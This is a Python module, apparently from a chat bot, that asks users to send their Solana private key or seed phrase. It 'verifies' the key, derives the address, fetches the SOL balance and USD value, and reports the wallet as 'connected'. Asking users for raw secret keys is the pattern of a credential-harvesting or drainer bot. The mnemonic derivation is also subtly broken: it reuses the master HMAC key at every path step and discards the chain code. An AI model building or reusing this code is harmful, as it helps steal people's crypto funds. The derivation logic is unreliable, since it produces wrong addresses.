# ─────────────────────────────────────────────
#  WALLET — Solana wallet verification and balance
# ─────────────────────────────────────────────
import httpx
import base58
import hashlib
import hmac
import struct

from config import HELIUS_RPC_URL


# ── Check if input is a valid base58 private key ──
def is_valid_private_key(key_str):
    try:
        key_str = key_str.strip()
        decoded = base58.b58decode(key_str)
        return len(decoded) == 64
    except Exception:
        return False


# ── Check if input is a valid mnemonic phrase ──
def is_valid_mnemonic(phrase):
    words = phrase.strip().split()
    return len(words) in [12, 18, 24]


# ── Derive Solana public key from private key ──
def get_pubkey_from_private_key(key_str):
    try:
        from nacl.signing import SigningKey
        key_str = key_str.strip()
        decoded = base58.b58decode(key_str)
        signing_key = SigningKey(decoded[:32])
        verify_key  = signing_key.verify_key
        pubkey_bytes = bytes(verify_key)
        return base58.b58encode(pubkey_bytes).decode("utf-8")
    except Exception:
        return None


# ── Derive Solana public key from mnemonic ────
def get_pubkey_from_mnemonic(phrase):
    try:
        from mnemonic import Mnemonic
        from nacl.signing import SigningKey
        mnemo = Mnemonic("english")
        seed  = mnemo.to_seed(phrase.strip(), passphrase="")
        # Solana derivation path: m/44'/501'/0'/0'
        path  = [44 + 0x80000000, 501 + 0x80000000, 0 + 0x80000000, 0 + 0x80000000]
        key   = seed[:64]
        il    = seed[:32]
        for index in path:
            data = b"\x00" + il + struct.pack(">I", index)
            h    = hmac.new(b"ed25519 seed", data, hashlib.sha512).digest()
            il   = h[:32]
        signing_key = SigningKey(il)
        pubkey_bytes = bytes(signing_key.verify_key)
        return base58.b58encode(pubkey_bytes).decode("utf-8")
    except Exception:
        return None


# ── Get SOL balance from Helius ───────────────
async def get_sol_balance(pubkey):
    try:
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "getBalance",
            "params": [pubkey],
        }
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.post(HELIUS_RPC_URL, json=payload)
            data = resp.json()
            lamports = data["result"]["value"]
            sol = lamports / 1_000_000_000
            return sol
    except Exception:
        return None


# ── Get USD value of SOL ──────────────────────
async def get_sol_price_usd():
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.get(
                "https://api.coingecko.com/api/v3/simple/price",
                params={"ids": "solana", "vs_currencies": "usd"},
            )
            data = resp.json()
            return data["solana"]["usd"]
    except Exception:
        return None


# ── Main verify function ──────────────────────
async def verify_wallet(user_input):
    user_input = user_input.strip()
    pubkey     = None
    input_type = None

    if is_valid_private_key(user_input):
        input_type = "private_key"
        pubkey     = get_pubkey_from_private_key(user_input)
    elif is_valid_mnemonic(user_input):
        input_type = "mnemonic"
        pubkey     = get_pubkey_from_mnemonic(user_input)
    else:
        return {
            "valid":   False,
            "message": (
                "Invalid wallet input.\n\n"
                "Please send a valid:\n"
                "- Private key (base58 encoded)\n"
                "- Seed phrase (12, 18, or 24 words)"
            ),
        }

    if not pubkey:
        return {
            "valid":   False,
            "message": "Could not derive wallet address. Please check your input and try again.",
        }

    balance = await get_sol_balance(pubkey)
    if balance is None:
        return {
            "valid":   False,
            "message": "Wallet found but could not fetch balance. Please try again.",
        }

    price   = await get_sol_price_usd()
    usd_val = round(balance * price, 2) if price else 0.00

    return {
        "valid":      True,
        "pubkey":     pubkey,
        "balance":    round(balance, 4),
        "usd":        usd_val,
        "input_type": input_type,
        "message": (
            "Wallet connected successfully!\n\n"
            "Your wallet address:\n"
            "Solana: " + pubkey + "\n\n"
            "Bal: " + str(round(balance, 4)) + " SOL - $" + str(usd_val) + "\n\n"
            "Click on the Refresh button to update your current balance"
        ),
    }
